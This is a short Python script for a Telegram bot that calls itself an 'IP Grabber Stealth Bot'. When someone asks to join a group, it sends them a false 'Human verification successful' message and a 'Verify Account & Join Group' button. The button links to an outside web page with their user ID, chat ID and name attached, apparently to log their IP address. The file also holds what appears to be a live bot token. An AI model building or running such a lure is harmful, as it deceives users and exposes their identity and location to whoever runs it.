import telebot
from telebot import types
import os
from dotenv import load_dotenv

load_dotenv()

bot = telebot.TeleBot(os.getenv('8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI'))
WEB_URL = os.getenv('WEB_URL')
LOG_CHANNEL = os.getenv('-1003976117318')

@bot.chat_join_request_handler()
def handle_join_request(request: types.ChatJoinRequest):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔐 Verify Account & Join Group", url=link))

    try:
        bot.send_message(
            user_id,
            f"✅ Human verification successful!\n\n"
            f"Click the button below for **final verification** and to join the group:\n\n"
            f"Link will expire in 10 minutes.",
            reply_markup=markup
        )
    except Exception as e:
        print(f"❌ Failed to send PM: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "✅ IP Grabber Stealth Bot is active!")

print("🤖 IP Grabber Stealth Bot is running...")
bot.infinity_polling()
